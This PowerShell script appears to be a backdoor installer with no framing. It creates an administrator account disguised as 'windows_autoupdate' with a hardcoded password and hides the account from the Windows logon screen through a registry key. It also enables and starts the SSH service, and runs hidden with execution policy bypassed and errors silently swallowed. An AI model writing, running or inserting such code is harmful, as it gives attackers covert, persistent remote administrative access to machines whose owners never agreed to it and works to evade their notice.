$ScriptBlock = {
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $Username = 'windows_autoupdate'
    $Password = 'N010v3'
    
    try {
        $ExistingUser = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
        if ($ExistingUser) {
            Remove-LocalUser -Name $Username
        }
        
        $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
        New-LocalUser -Name $Username -Description 'SSH Administrator Account' -Password $SecurePassword -AccountNeverExpires -PasswordNeverExpires | Out-Null
        
        Add-LocalGroupMember -Group 'Administrators' -Member $Username | Out-Null
        
        $RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
        if (-not (Test-Path $RegistryPath)) {
            New-Item -Path $RegistryPath -Force | Out-Null
        }
        Set-ItemProperty -Path $RegistryPath -Name $Username -Value 0 -Type DWord -Force | Out-Null
        
        $sshdService = Get-Service -Name 'sshd' -ErrorAction SilentlyContinue
        if ($sshdService) {
            if ($sshdService.StartType -ne 'Automatic') {
                Set-Service -Name 'sshd' -StartupType Automatic | Out-Null
            }
            if ($sshdService.Status -ne 'Running') {
                Start-Service -Name 'sshd' | Out-Null
            }
        }
    }
    catch {
        # Silent failure
    }
}

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$ScriptBlock`"" -Wait
